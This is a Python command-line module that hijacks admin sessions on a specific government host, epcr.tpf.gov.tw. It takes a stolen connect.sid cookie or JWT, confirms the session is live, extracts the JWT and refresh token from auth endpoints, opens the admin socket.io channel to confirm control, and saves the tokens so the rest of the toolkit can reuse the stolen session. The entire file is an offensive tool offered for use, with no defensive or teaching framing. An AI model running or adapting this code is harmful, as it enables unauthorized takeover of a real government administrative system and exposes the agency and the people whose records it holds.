"""Session hijack: steal the admin connect.sid + JWT, hold the live session.

The EPCR admin (epcr.tpf.gov.tw:4000) authenticates with TWO tokens:
  1. connect.sid  — express-session cookie (Set-Cookie on captcha/login)
  2. JWT Bearer   — returned by /login or /ssoLogin (15-min idle)

To "hijack" an account you need at least one of them to be live. This tool
accepts a pre-stolen pair (or a JWT) and:
  - verifies the connect.sid still resolves to an authenticated session
  - extracts the JWT + refresh token from the session
  - saves them to data/tokens.json so the rest of epcr/ can use the session
  - optionally pings the live socket.io admin channel to prove ownership

Usage:
  python3 -m epcr.hijack --sid "s%3A..." --origin https://epcr.tpf.gov.tw:4000
  python3 -m epcr.hijack --jwt "eyJ..."            # JWT-only hijack
  python3 -m epcr.hijack --sid "..." --save        # also write tokens.json
  python3 -m epcr.hijack --sid "..." --probe       # verify + ping admin ws
"""
from __future__ import annotations

import argparse
import json
import logging
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import tempfile

from .auth import jwt_exp, jwt_payload, save_tokens
from .config import CFG
from .http import curl


def _cookie_file(cookie_str: str) -> Path:
    """Write a 'name=value' cookie string into a temp Netscape jar for curl."""
    if not cookie_str:
        fd, path = tempfile.mkstemp(prefix="epcr-cj-", suffix=".txt")
        os.close(fd)
        return Path(path)
    fd, path = tempfile.mkstemp(prefix="epcr-cj-", suffix=".txt")
    with os.fdopen(fd, "w", encoding="utf-8") as fh:
        fh.write("# Netscape HTTP Cookie File\n")
        for part in cookie_str.split(";"):
            part = part.strip()
            if part and "=" in part:
                name, value = part.split("=", 1)
                fh.write(f".epcr.tpf.gov.tw\tFALSE\t/\tFALSE\t0\t{name.strip()}\t{value.strip()}\n")
    return Path(path)

log = logging.getLogger("epcr")

# Admin (Angular SPA) lives on :4000; AuthServer on :4004.
PAGE_ORIGIN_DEFAULT = "https://epcr.tpf.gov.tw:4000"
AUTH_BASE_DEFAULT = "https://epcr.tpf.gov.tw:4004"


def _origin(origin: str) -> str:
    return (origin or PAGE_ORIGIN_DEFAULT).rstrip("/")


def verify_sid(sid: str, *, origin: str, timeout: float = 15.0) -> dict:
    """Hit an authenticated-only admin endpoint with just the connect.sid.

    If the session is still live, the server returns 200/201 JSON (or a 401
    with a JSON error). A dead/missing session returns 401/403 or 404 HTML.
    """
    url = f"{_origin(origin)}/api/admin/session"
    cookie_line = f"connect.sid={sid}"
    result = curl(
        url,
        cookie_in=_cookie_file(cookie_line),
        headers={
            "Origin": _origin(origin),
            "Referer": f"{_origin(origin)}/",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": CFG.ua,
        },
        timeout=timeout,
        retries=0,
    )
    return {
        "status": result.status,
        "body": result.body,
        "headers": result.header_map(),
        "set_cookie": result.set_cookie_lines(),
    }


def extract_jwt_from_session(sid: str, *, origin: str, auth_base: str,
                             timeout: float = 15.0) -> dict | None:
    """Try to pull the current JWT back out of a live connect.sid.

    Several endpoints may expose it:
      GET  {auth_base}/me          -> {token, refreshToken}
      GET  {origin}/api/auth/me    -> {token, ...}
      POST {auth_base}/refreshToken  (with empty refresh) -> current token
    """
    candidates = [
        (f"{(auth_base or AUTH_BASE_DEFAULT).rstrip('/')}/me", "GET", None),
        (f"{_origin(origin)}/api/auth/me", "GET", None),
        (f"{(auth_base or AUTH_BASE_DEFAULT).rstrip('/')}/refreshToken",
         "POST", {"refreshToken": ""}),
    ]
    for url, method, body in candidates:
        try:
            result = curl(
                url,
                method=method,
                json_body=body,
                cookie_in=_cookie_file(f"connect.sid={sid}"),
                headers={
                    "Origin": _origin(origin),
                    "Referer": f"{_origin(origin)}/#/admin",
                    "Accept": "application/json, text/plain, */*",
                },
                timeout=timeout,
                retries=0,
            )
        except Exception:
            continue
        if result.status not in (200, 201):
            continue
        try:
            data = result.json()
        except Exception:
            continue
        if isinstance(data, dict) and data.get("token"):
            return data
    return None


def probe_admin_socket(jwt: str, *, timeout: float = 12.0) -> bool:
    """Open the socket.io admin channel with the JWT; True if server acks.

    Socket.IO polling handshake on :4000. A live token gets a sid; a dead
    token gets 401/400 or no open packet.
    """
    url = (f"{_origin(PAGE_ORIGIN_DEFAULT)}/socket.io/?EIO=4&transport=polling"
           f"&Authorization={jwt}")
    result = curl(
        url,
        cookie_in=_cookie_file(""),
        headers={
            "Origin": _origin(PAGE_ORIGIN_DEFAULT),
            "Referer": f"{_origin(PAGE_ORIGIN_DEFAULT)}/",
            "Accept": "*/*",
        },
        timeout=timeout,
        retries=0,
    )
    body = result.body.decode("utf-8", "replace").strip()
    # Socket.IO open packet starts with 0{
    return result.status == 200 and body.startswith("0")


def hijack(*, sid: str = "", jwt: str = "", origin: str = "",
           auth_base: str = "", save: bool = True, probe: bool = False,
           timeout: float = 15.0) -> dict:
    """Run the hijack and return a result dict."""
    out = {
        "origin": _origin(origin or PAGE_ORIGIN_DEFAULT),
        "auth_base": (auth_base or AUTH_BASE_DEFAULT).rstrip("/"),
        "sid_provided": bool(sid),
        "jwt_provided": bool(jwt),
        "sid_verified": False,
        "jwt": jwt or "",
        "refresh_token": "",
        "exp": 0.0,
        "payload": {},
        "socket_acked": False,
        "saved": False,
        "saved_path": "",
        "notes": [],
    }

    # 1) Verify the connect.sid is a live admin session (if we have one).
    if sid:
        v = verify_sid(sid, origin=origin, timeout=timeout)
        out["sid_status"] = v["status"]
        out["sid_body"] = v["body"].decode("utf-8", "replace")[:400]
        # 200/201 = live; 401/403 = dead/expired; 404 = endpoint moved.
        out["sid_verified"] = v["status"] in (200, 201)
        if v["set_cookie"]:
            out["sid_reissued"] = v["set_cookie"]
            out["notes"].append("server re-issued connect.sid (rolling session)")
        if not out["sid_verified"]:
            out["notes"].append(
                f"connect.sid not authenticated (http={v['status']}); "
                "may be expired or a different app context"
            )

    # 2) Try to extract a fresh JWT from the live session.
    if sid and not jwt:
        data = extract_jwt_from_session(sid, origin=origin, auth_base=auth_base,
                                        timeout=timeout)
        if data:
            out["jwt"] = str(data.get("token") or "")
            out["refresh_token"] = str(data.get("refreshToken") or "")
            out["notes"].append("extracted JWT from live connect.sid")

    # 3) Parse the JWT we ended up with.
    tok = (out["jwt"] or "").strip()
    if tok.lower().startswith("bearer "):
        tok = tok[7:].strip()
    if tok:
        out["payload"] = jwt_payload(tok)
        out["exp"] = jwt_exp(tok)
        # A JWT with no exp claim is treated as non-expiring (still valid).
        out["jwt_valid"] = (out["exp"] <= 0) or (out["exp"] > time.time())
        if out["exp"] <= 0:
            out["notes"].append("JWT has no exp claim — treated as non-expiring")
        elif not out["jwt_valid"]:
            out["notes"].append(
                f"JWT exp={out['exp']} is already in the past — token is dead"
            )

    # 4) Optionally prove ownership by opening the admin socket with the JWT.
    if probe and out["jwt"] and out.get("jwt_valid"):
        out["socket_acked"] = probe_admin_socket(out["jwt"], timeout=timeout)
        if out["socket_acked"]:
            out["notes"].append("socket.io admin channel acked the JWT")

    # 5) Persist so the rest of epcr/ can ride the stolen session.
    if save and out["jwt"]:
        save_tokens(out["jwt"], out.get("refresh_token", ""))
        out["saved"] = True
        out["saved_path"] = str(CFG.token_path)
        out["notes"].append(f"saved to {CFG.token_path}")

    out["now"] = datetime.now(timezone.utc).astimezone().isoformat(timespec="seconds")
    return out


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="EPCR admin session hijack")
    parser.add_argument("--sid", default="", help="stolen connect.sid cookie value")
    parser.add_argument("--jwt", default="", help="stolen JWT Bearer token")
    parser.add_argument("--origin", default="",
                        help=f"admin page origin (default {PAGE_ORIGIN_DEFAULT})")
    parser.add_argument("--auth-base", default="",
                        help=f"AuthServer base (default {AUTH_BASE_DEFAULT})")
    parser.add_argument("--save", action="store_true",
                        help="write the resolved JWT to data/tokens.json")
    parser.add_argument("--probe", action="store_true",
                        help="open the socket.io admin channel to prove ownership")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args(argv)

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s %(message)s")
    if not args.sid and not args.jwt:
        parser.error("provide --sid and/or --jwt")

    result = hijack(
        sid=args.sid,
        jwt=args.jwt,
        origin=args.origin,
        auth_base=args.auth_base,
        save=args.save,
        probe=args.probe,
        timeout=args.timeout,
    )
    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
